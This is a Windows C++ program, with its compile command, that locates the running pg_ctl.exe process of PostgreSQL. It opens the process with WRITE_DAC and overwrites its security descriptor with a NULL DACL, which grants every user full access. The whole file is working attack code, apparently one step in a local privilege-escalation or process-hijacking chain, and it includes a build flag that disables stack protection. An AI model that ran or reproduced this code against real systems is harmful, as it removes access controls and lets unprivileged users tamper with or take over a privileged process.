// "c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
// cl.exe /nologo /Ox /MT /W0 /GS- /DNDDEBUG /TP pg_ctl_grant_access.cpp /link /OUT:pg_ctl_grant_access.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

#pragma comment(lib, "advapi32.lib")

#include <windows.h>
#include <stdio.h>
#include <aclapi.h>
#include <tlhelp32.h>

DWORD Getprocess_idByName(const char* processName) {
    PROCESSENTRY32 pe32;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }
    do {
        if (strcmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

void main()
{
	HANDLE process_handle = NULL;
    DWORD dwRes, dwDisposition;
    SECURITY_INFORMATION SecurityInformation = NULL;
    PACL pACL = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;
	
	DWORD process_id = Getprocess_idByName("pg_ctl.exe");
	if(!process_id)
	{
		printf("Could not obtain the process ID of pg_ctl.exe!\n");
		return;
	}
	// 1. Test if we can open the process for ALL_ACCESS 
	process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if (process_handle) 
	{
        printf("Successfully opened the target process with ALL_ACCESS, no DACL tuning required.\n");
		return;
	}
	printf("Could not open the target process, which means that PROCESS_ALL_ACCESS request was denied. Let's try to overwrite the security descriptor.\n");
	process_handle = OpenProcess(WRITE_DAC, FALSE, process_id);
	if(!process_handle)
	{
		printf("Could not open the process for WRITE_DAC.\n");
		return;
	}
	
    // 2. initialize a new security descriptor
    pSD = (PSECURITY_DESCRIPTOR) LocalAlloc(LPTR,SECURITY_DESCRIPTOR_MIN_LENGTH);
    if (NULL == pSD) 
    { 
        printf("LocalAlloc Error\n");		
        return;
    }
	if(!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION))
    {  
        printf("InitializeSecurityDescriptor Error.\n");
		return;
	}
	// 3. Set a NULL ACL, which means all access requests will be granted.
	if(!SetSecurityDescriptorDacl(pSD,TRUE,NULL,FALSE))
	{
		printf("Could not set the security descriptor DACL! Error code: %d\n",GetLastError());
		return;
	}
	// 4. Finally, set the new descriptor on the process.
	if(!SetKernelObjectSecurity(process_handle, DACL_SECURITY_INFORMATION, pSD)) // as per https://learn.microsoft.com/en-us/windows/win32/secauthz/security-information
	{
		printf("Could not overwrite the security descriptor! Error code: %d\n",GetLastError());
		return;
	}
	printf("Done!\n");
}